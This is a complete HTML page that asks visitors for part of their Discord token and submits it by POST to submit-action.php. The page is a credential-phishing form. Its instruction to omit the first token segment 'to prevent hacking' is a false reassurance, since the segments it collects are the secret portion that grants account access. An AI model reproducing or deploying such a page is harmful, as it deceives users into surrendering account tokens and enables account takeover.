<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Enter Discord Token</title>
<style>
  body {
    background-color: black;
    color: white;
    font-family: Arial, sans-serif;
    text-align: center;
    margin: 0;
    padding: 0;
  }
  .container {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    flex-direction: column;
  }
  .input-label {
    font-size: 18px;
    margin-bottom: 10px;
  }
  .input-field {
    padding: 10px;
    font-size: 16px;
    border-radius: 5px;
    border: 1px solid #ccc;
    width: 300px;
    margin-bottom: 20px;
  }
  .submit-btn {
    background-color: green;
    color: white;
    padding: 10px 20px;
    text-decoration: none;
    border-radius: 5px;
    font-size: 18px;
  }
</style>
</head>
<body>
<div class="container">
  <div>
    <p class="input-label">Please enter the last part of your Discord token.</p>
    <p class="input-label">It will look like this:</p>
    <p class="input-label">XXXXXXXXXXXXXXXXXXXXXXXX.OOOOO.OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO</p>
    <p class="input-label">Do not enter the part marked X, but only enter the part marked O. (To prevent hacking)</p>
  </div>
  <form action="submit-action.php" method="POST">
    <input type="text" class="input-field" name="token" placeholder="Enter the OOOOO.OOOOOO~ part">
    <button type="submit" class="submit-btn">Submit</button>
  </form>
</div>
</body>
</html>
